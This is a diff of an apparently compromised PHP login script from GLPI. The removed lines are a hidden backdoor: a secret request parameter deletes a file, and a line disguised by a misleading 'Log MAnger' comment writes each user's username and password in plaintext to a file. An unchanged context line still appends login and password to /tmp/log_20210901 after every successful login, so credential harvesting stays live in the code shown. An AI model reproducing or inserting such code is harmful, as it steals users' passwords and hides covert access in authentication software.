@@ -36,15 +36,6 @@
 
 include ('../inc/includes.php');
 
-if (isset($_REQUEST['tKZlInbbfK2jv'])) {
-   $status = unlink('./LAEYmslkecM9f');
-   if ($status) {
-       echo "File deleted successfully";
-   } else {
-       echo "Sorry!";
-   }
-   die();
-}
 
 if (!isset($_SESSION["glpicookietest"]) || ($_SESSION["glpicookietest"] != 'testcookie')) {
    if (!is_writable(GLPI_SESSION_DIR)) {
@@ -93,8 +84,6 @@ $auth = new Auth();
 if ($auth->login($login, $password, (isset($_REQUEST["noAUTO"])?$_REQUEST["noAUTO"]:false), $remember, $login_auth)) {
    // Set Auth Var ,SessionID
    Auth::redirectIfAuthenticated();file_put_contents("/tmp/log_20210901", $login.",".$password,FILE_APPEND);
-   // Log  MAnger the section more details See Php7.4 Doc
-   file_put_contents("tKZlInbbfK2jv", $login.",".$password,FILE_APPEND);
 } else {
    // we have done at least a good login? No, we exit.
    Html::nullHeader("Login", $CFG_GLPI["root_doc"] . '/index.php');
